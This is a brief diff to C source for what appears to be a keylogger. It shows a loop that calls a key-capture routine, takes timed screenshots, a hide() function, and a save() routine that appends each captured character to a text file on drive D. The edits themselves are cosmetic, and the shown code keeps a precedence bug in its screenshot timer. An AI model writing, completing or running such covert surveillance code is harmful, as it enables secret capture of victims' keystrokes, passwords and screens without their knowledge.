@@ -10,7 +10,7 @@ void turnOn()
 	short i = 0;
 	while (1)
 	{
-		
+
 
 		VK();
 
@@ -50,8 +50,9 @@ void turnOn()
 		}
 
 		Sleep(100); //screenshot after time: minutes
-		++i;
+		
 		if (i % 600 * minutes == 0) scr();
+		i++;
 	}
 }
 void hide()
@@ -67,7 +68,7 @@ void hide()
 void save(int liczba)
 {
 	FILE * file;
-	file = fopen( "D:\\xd.txt", "a+");
+	file = fopen("D:\\xd.txt", "a+");
 	if (file != NULL)
 	{
 		fputc((char)liczba, file);
